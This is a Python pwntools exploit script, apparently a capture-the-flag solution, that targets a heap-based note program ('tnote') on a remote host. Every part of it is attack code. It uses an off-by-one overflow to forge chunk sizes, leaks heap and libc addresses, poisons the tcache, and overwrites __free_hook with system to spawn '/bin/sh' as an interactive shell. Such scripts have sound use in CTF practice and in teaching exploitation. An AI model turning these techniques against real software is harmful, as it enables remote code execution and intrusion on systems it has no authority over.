#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- author: n0trix -*-

from pwn import *

context.log_level = 'debug'

elf  = ELF('./tnote')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#io   = process(elf.path)
io   = remote('47.98.229.132',10000)


def add(size):
    io.sendlineafter('choice: ','A')
    io.sendlineafter('size?',str(size))

def edit(idx,con):
    io.sendlineafter('choice: ','E')
    io.sendlineafter('idx?',str(idx))
    io.sendlineafter('content:',con)

def show(idx):
    io.sendlineafter('choice: ','S')
    io.sendlineafter('idx?',str(idx))
    return io.recvuntil('Done!',drop=True)

def dele(idx):
    io.sendlineafter('choice: ','D')
    io.sendlineafter('idx?',str(idx))


add(0x18) #0
add(0x18) #1
add(0x48) #2
add(0x68) #3
#gdb.attach(io)

dele(2)

edit(0,'\x71'*0x19)
dele(1)
dele(3)
#gdb.attach(io)
add(0x68) #1 old 3
heap_base = u64(show(1)[-6:].ljust(8,'\x00'))-0x280
print hex(heap_base)

add(0x68) #2 old 1
edit(2,p64(0)*3+p64(0x61)+p64(heap_base+0x10))
add(0x48) #3

#get tcache struct
add(0x48) #4
edit(4,'\x00'*10+'\x07')
edit(0,'\xc1'*0x19)
edit(1,0x48*'\x00'+p64(0x21))
#gdb.attach(io)
dele(2)
#split unsortedbin
add(0x10) #2
main_arena = u64(show(2)[-6:].ljust(8,'\x00'))-272
malloc_hook = main_arena-0x10
log.success('main_arena: '+hex(main_arena))
log.success('mallochook: '+hex(malloc_hook))
libc_base = main_arena-0x10-libc.sym['__malloc_hook']
log.success('libc: '+hex(libc_base))

edit(4,'\x07'*0x40+p64(libc_base+libc.sym['__free_hook']))
#gdb.attach(io)
add(0x10) #5
edit(5,p64(libc_base+libc.sym['system']))
edit(0,'/bin/sh\x00')
dele(0)
io.interactive()

